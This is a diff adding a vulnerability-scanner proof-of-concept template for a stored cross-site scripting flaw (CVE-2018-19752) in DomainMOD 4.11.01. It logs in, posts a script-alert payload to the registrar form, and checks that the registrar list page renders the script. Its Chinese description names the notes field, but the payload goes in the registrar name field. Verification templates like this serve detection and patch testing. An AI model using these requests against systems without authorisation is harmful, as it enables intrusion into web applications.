@@ -1,0 +1,70 @@
+[info]
+author = "ave"
+description = "验证 DomainMOD 4.11.01 中 assets/add/registrar.php 页面的 notes 字段存储型 XSS 漏洞。攻击者登录后提交恶意脚本，管理员访问 registrars.php 时触发执行。"
+id = "POC-AVE-2018-0153"
+name = "DomainMOD 4.11.01 Registrar Cross-Site Scripting PoC"
+severity = "medium"
+tags = ["ave-2018-0153"]
+vuln_id = [
+    "CVE-2018-19752",
+    "AVE-2018-0153",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_username={{username}}&new_password={{password}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/assets/add/registrar.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_registrar=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=test&new_api_registrar_id=0&new_notes=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/assets/registrars.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"><script>alert(document.domain)</script></a>']
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
